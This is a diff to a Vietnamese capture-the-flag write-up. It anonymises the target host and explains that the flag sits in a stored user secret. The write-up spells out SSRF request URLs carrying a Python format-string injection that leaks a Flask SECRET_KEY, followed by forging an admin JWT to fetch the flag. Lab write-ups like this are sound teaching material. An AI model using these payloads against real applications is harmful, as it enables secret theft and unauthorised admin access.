@@ -45,15 +45,20 @@ Hàm `.format()` trong python không chỉ replace text đơn giản,mà còn ch
 
 Ok đã lấy được `SECRET_KEY`,ta có thể lợi dùng `/logs` để log secret key vào pdf:
 ```
-http://154.57.164.62:31350/bartender.php?url=http://127.0.0.1:5000/logs?secret=http://127.0.0.1:5000/logs?secret={logify.__globals__[app].config[SECRET_KEY]}&url=https://example.com&secret=test&name=test
+http://<HOST>:<PORT>/bartender.php?url=http://127.0.0.1:5000/logs?secret=http://127.0.0.1:5000/logs?secret={logify.__globals__[app].config[SECRET_KEY]}&url=https://example.com&secret=test&name=test
 ```
 Đọc file pdf trả về để lấy secret key:
 ```python
 # VD: 
 http://127.0.0.1:5000/logs?secret=http://127.0.0.1:5000/logs?secret=<SECRET_KEY>
 ```
+Vì flag được lưu ở secret của user `oldest_user_of_bartender`:
+```python
+query ="INSERT INTO secrets (name, secret) VALUES (?, ?)"
+values = ('oldest_user_of_bartender', read_flag())
+```
 
-Sau khi lấy được secret key,sign JWT :
+Nên sau khi lấy được secret key,sign JWT :
 ```json
 {
         'is_admin': True,
@@ -62,7 +67,7 @@ Sau khi lấy được secret key,sign JWT :
 ```
 Tiếp tục sử dụng bug SSRF để gửi jwt đến `/bartender` để lấy flag:
 ```
-http://154.57.164.62:31350/bartender.php?url=http://127.0.0.1:5000/bartender?token=<JWT_Token>&url=https%3A%2F%2Fexample.com&secret=test&name=test
+http://<HOST>:<PORT>/bartender.php?url=http://127.0.0.1:5000/bartender?token=<JWT_Token>&url=https%3A%2F%2Fexample.com&secret=test&name=test
 ```
 Mở file pdf để lấy flag:
 ```json
